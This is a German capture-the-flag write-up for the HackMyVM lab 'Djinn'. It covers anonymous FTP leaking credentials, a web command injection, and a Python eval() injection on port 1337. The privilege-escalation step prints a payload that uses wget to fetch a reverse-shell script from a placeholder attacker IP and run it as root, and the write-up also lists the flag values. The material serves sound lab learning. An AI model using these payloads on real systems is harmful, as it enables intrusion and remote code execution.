# Djinn - HackMyVM (Easy)

![Djinn.png](Djinn.png)

## Übersicht

*   **VM:** Djinn
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Djinn)
*   **Schwierigkeit:** Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 05. Oktober 2022
*   **Original-Writeup:** https://alientec1908.github.io/Djinn_HackMyVM_Easy/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser "Easy"-Challenge war es, Root-Zugriff auf der Maschine "Djinn" zu erlangen. Die Enumeration deckte einen FTP-Server mit anonymem Zugriff auf, von dem drei Textdateien heruntergeladen wurden. Eine davon (`creds.txt`) enthielt die Zugangsdaten `nitu:81299`. Eine andere Datei (`game.txt`) verwies auf ein Spiel auf Port 1337. Der Port 7331 wurde später ebenfalls untersucht. Der primäre Angriffsvektor war eine Python Code Injection Schwachstelle (via `eval()`) im Spiel auf Port 1337. Durch Injektion eines Payloads, der `wget` zum Herunterladen eines Reverse-Shell-Skripts und dessen anschließende Ausführung nutzte, wurde eine Root-Shell erlangt. Der initiale Zugriff über eine Command Injection in `/genie` (Port 7331) als `www-data` war ein alternativer, aber nicht der effizienteste Weg.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `lftp`
*   `gobuster`
*   `nc` (netcat)
*   `python3` (für Exploit, http.server, pty)
*   `base64`
*   `wget` (auf Zielsystem via Exploit)
*   Standard Linux-Befehle (`vi`, `cat`, `bash`, `which`, `export`, `ls`, `find`, `chmod`, `id`, `cd`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Djinn" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Information Gathering (FTP & Port 1337):**
    *   IP-Findung mittels `arp-scan` (Ziel: `192.168.2.118`).
    *   `nmap`-Scan identifizierte FTP (21/tcp, vsftpd 3.0.3, anonymer Login erlaubt), SSH (22/tcp, filtered) und einen unbekannten Dienst auf Port 1337/tcp.
    *   Über anonymen FTP-Zugriff wurden drei Dateien heruntergeladen:
        *   `message.txt`: Erwähnte `@nitish81299`.
        *   `game.txt`: Hinweis auf ein Spiel auf Port 1337.
        *   `creds.txt`: Enthielt die Zugangsdaten `nitu:81299`.
    *   Eine Verbindung zu Port 1337 (`nc 192.168.2.118 1337`) zeigte ein mathematisches Spiel, das 1000 richtige Antworten verlangte.

2.  **Web Enumeration (Port 7331) & Alternativer Initial Access (als `www-data`):**
    *   *(Die Entdeckung von Port 7331 ist im Log nicht klar, wird aber untersucht.)*
    *   `gobuster` auf Port 7331 fand die Endpunkte `/wish` und `/genie`.
    *   Eine Command Injection Schwachstelle wurde (vermutlich im Parameter `name` von `/genie`) ausgenutzt, um eine Reverse Shell als `www-data` zu erhalten. (Dieser Weg war parallel zum direkten Root-Exploit.)

3.  **Privilege Escalation (direkt zu Root via Python Eval Injection auf Port 1337):**
    *   Das Spiel auf Port 1337 wurde auf Code Injection getestet.
    *   Durch Eingabe von `eval('__import__("os").system("id")')` als Antwort im Spiel wurde bestätigt, dass der Dienst als `root` läuft und für Python `eval()`-Injection anfällig ist.
    *   Ein Bash-Reverse-Shell-Skript (`execute.sh`) wurde auf dem Angreifer-System erstellt.
    *   Ein Python-HTTP-Server wurde auf dem Angreifer-System gestartet, um `execute.sh` bereitzustellen.
    *   Ein Netcat-Listener wurde auf dem Angreifer-System gestartet.
    *   Folgender Payload wurde in das Spiel auf Port 1337 injiziert (via `eval()`): `__import__("os").system("wget http://[Angreifer-IP]:[HTTP-Port]/execute.sh -O /tmp/execute.sh && chmod +x /tmp/execute.sh && bash /tmp/execute.sh")`.
    *   Dies lud das Skript herunter, machte es ausführbar und führte es aus, was eine Reverse Shell als `root` zum Listener des Angreifers etablierte.

4.  **Flags:**
    *   Als `root` wurden die User-Flag (`/home/nitish/user.txt`) und die Root-Flag (`/root/root.txt`) gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Anonymer FTP-Zugriff mit sensiblen Dateien:** Zugangsdaten (`nitu:81299`) wurden über anonymes FTP preisgegeben.
*   **Python `eval()` Injection:** Ein Dienst auf Port 1337 verwendete `eval()` unsicher zur Verarbeitung von Benutzereingaben, was zur RCE als `root` führte.
*   **Command Injection (Web):** Eine Schwachstelle im `/genie`-Endpunkt auf Port 7331 ermöglichte RCE als `www-data` (alternativer Pfad).
*   **Information Disclosure:** Hinweise in Textdateien auf FTP und die Natur des Dienstes auf Port 1337.
*   **SUID-Binary `/usr/bin/genie`:** Ein SUID-Binary, das `sam` gehört und von `nitish` ausgeführt werden könnte, wurde identifiziert, aber nicht im erfolgreichen Angriffspfad verwendet.

## Flags

*   **User Flag (`/home/nitish/user.txt`):** `HMV{WW91IGZvdW5kIHRoZSBmaXJzdCBzdGVw}`
*   **Root Flag (`/root/root.txt`):** `HMV{eWVzIHlvdSBhcmUgY29vbA}`

## Tags

`HackMyVM`, `Djinn`, `Easy`, `FTP`, `Anonymous Access`, `Credentials Disclosure`, `Python`, `eval Injection`, `RCE`, `Command Injection`, `Web`, `Privilege Escalation`, `Linux`
